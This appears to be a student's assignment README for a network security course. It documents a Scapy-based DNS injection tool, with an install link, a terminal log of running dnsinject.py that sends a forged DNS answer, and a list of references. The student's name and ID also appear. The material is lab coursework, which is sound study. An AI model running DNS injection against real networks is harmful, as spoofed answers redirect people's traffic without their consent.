Name: Jay R Torasakar
SBU ID: 111406252

--------------------------------------------------------------------

Assignment 4

--------------------------------------------------------------------

Installation of Python Scapy from: https://www.devmanuals.net/install/ubuntu/ubuntu-16-04-LTS-Xenial-Xerus/how-to-install-python-scapy.html


DNS Inject Output:
jay@jay-VirtualBox:~$ sudo python dnsinject.py -i enp0s3 -h a.txt
WARNING: No route found for IPv6 destination :: (no default route?)
Interface is: enp0s3
File is : a.txt
Given filter is: 
DNS Injection begins....
 IP src 10.0.2.15 IP Destination 130.245.255.4
No Expresssion filter given
.
Sent 1 packets.
Sent packet IP / UDP / DNS Ans "10.0.2.15" 
 IP src 130.245.255.4 IP Destination 10.0.2.15
 IP src 10.0.2.15 IP Destination 130.245.255.4
No Expresssion filter given
 IP src 130.245.255.4 IP Destination 10.0.2.15
DNS Inject finished
jay@jay-VirtualBox:~$ 


References: 
1. https://www.devmanuals.net/install/ubuntu/ubuntu-16-04-LTS-Xenial-Xerus/how-to-install-python-scapy.html
2. https://docs.python.org/2/tutorial/modules.html
3. https://stackoverflow.com/questions/6382804/how-to-use-getopt-optarg-in-python-how-to-shift-arguments-if-too-many-arguments
4. https://gist.github.com/thepacketgeek/6928674
5. https://stackoverflow.com/questions/28292224/scapy-packet-sniffer-triggering-an-action-up-on-each-sniffed-packet
6. https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
7. https://stackoverflow.com/questions/27448905/send-packet-and-change-its-source-ip
